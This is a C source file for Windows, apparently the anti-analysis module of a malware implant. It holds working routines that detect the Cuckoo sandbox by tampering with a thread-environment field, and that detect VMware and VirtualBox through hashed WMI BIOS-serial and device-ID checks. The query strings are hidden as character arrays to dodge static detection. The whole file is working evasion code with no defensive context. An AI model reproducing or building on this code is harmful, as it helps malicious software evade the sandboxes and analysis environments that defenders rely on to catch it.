#include <Windows.h>
#include "utils.h"
#include "crypt.h"
#include "antivm.h"
#include "utils.h"

BOOL AntiVM()
{
	AntiCuckoo();
	BOOL bVMWare = AntiVMWare();
	BOOL bVBox = AntiVBox();

	if (bVMWare || bVBox)
		return TRUE;

	return FALSE;
}

VOID AntiCuckoo()
{
	LPDWORD pOld, pFake;

	pFake = (LPDWORD) malloc(4096*100);
	memset(pFake, 1, 4096*100);
	__asm
	{
		mov eax, fs:[0x44]		// save old value
		mov pOld, eax

		mov eax, pFake			// replace with fake value
		mov fs:[0x44], eax
	}

	// this will not be logged nor executed.
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) Sleep, (LPVOID) 1000, 0, NULL); 

	__asm
	{
		mov eax, pOld		// restore old value, not reached if cuckoo
		mov fs:[0x44], eax
	}

	free(pFake);
}

BOOL AntiVMWare()
{
	BOOL bVMWareFound = FALSE;
	IWbemLocator *pLoc=0;
	IWbemServices *pSvc=0;

	CoInitialize(NULL);
	if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc) != S_OK)
		return FALSE;
	if (!pLoc)
		return FALSE;

	WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
	BSTR bRootCIM = SysAllocString(strRootCIM);

	if (pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc) == WBEM_S_NO_ERROR) 
	{
		if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) == S_OK)
		{
			VARIANT vArg;
			VariantInit(&vArg);

			WCHAR strQuery[] = {L'S', L'E', L'L', L'E', L'C', L'T', L' ', L'*', L' ', L'F', L'R', L'O', L'M', L' ', L'W', L'i', L'n', L'3', L'2', L'_', L'B', L'i', L'o', L's', L'\0' }; 
			WCHAR strSerial[] = { L'S', L'e', L'r', L'i', L'a', L'l', L'N', L'u', L'm', L'b', L'e', L'r', L'\0' };
			if (WMIExecQueryGetProp(pSvc, strQuery, strSerial, &vArg) && vArg.vt == VT_BSTR)
			{
			
				/* 1] is it vmware? */

				LPWSTR strSerial = _wcsdup(vArg.bstrVal);
				LPWSTR strend = wcschr(strSerial, '-');
				
				if (strend)
				{
					BYTE pSha1Buffer[20];
					*strend = L'\0';
					CalculateSHA1(pSha1Buffer, (LPBYTE)strSerial, wcslen(strSerial));

					// check against sha1("VMware")
					if (!memcmp(pSha1Buffer, IS_VMWARE, 20))
					{
					
						/* 2] is it whitelisted? 
							  whitelist has this form: VMware-aa aa aa aa aa aa aa aa-f6 0f 93 5e 27 1a a2 64
						*/

						*strend = L'-';
						strend = wcsrchr(strSerial, '-');

						if (strend) // tautology, checking anyway..
						{
							*strend = L'\0';
							
							SecureZeroMemory(pSha1Buffer, 20);
							CalculateSHA1(pSha1Buffer, (LPBYTE)strSerial, wcslen(strSerial));

							// negative check against sha1("VMware - aa aa aa aa aa aa aa aa")
							if (memcmp(pSha1Buffer, VMWARE_WHITELISTED, 20))
								bVMWareFound = TRUE;
						}

					}
				} // if (strend)

				if (strSerial)
					free(strSerial);
				
			}
			VariantClear(&vArg);
		}
	}

	if(pSvc)
		pSvc->Release();
	if (pLoc)
		pLoc->Release();

	return bVMWareFound;
}

BOOL AntiVBox()
{
	BOOL bVBoxFound = FALSE;
	IWbemLocator *pLoc=0;
	IWbemServices *pSvc=0;

	CoInitialize(NULL);
	if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc) != S_OK)
		return FALSE;
	if (!pLoc)
		return FALSE;

	WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
	BSTR bRootCIM = SysAllocString(strRootCIM);

	if (pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc) == WBEM_S_NO_ERROR) 
	{
		if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) == S_OK)
		{
			VARIANT vArg;
			VariantInit(&vArg);

			WCHAR strQuery[] = { L'S', L'E', L'L', L'E', L'C', L'T', L' ', L'*', L' ', L'F', L'R', L'O', L'M', L' ', L'W', L'i', L'n', L'3', L'2', L'_', L'P', L'n', L'P', L'E', L'n', L't', L'i', L't', L'y', L'\0' };
			WCHAR strDeviceId[] = { L'D', L'e', L'v', L'i', L'c', L'e', L'I', L'd', L'\0' };
			if (WMIExecQuerySearchEntryHash(pSvc, strQuery, strDeviceId, (LPBYTE)VBOX_FAIL, &vArg))
				bVBoxFound = TRUE;
			VariantClear(&vArg);
		}
	}

	if(pSvc)
		pSvc->Release();
	if (pLoc)
		pLoc->Release();

	return bVBoxFound;
}


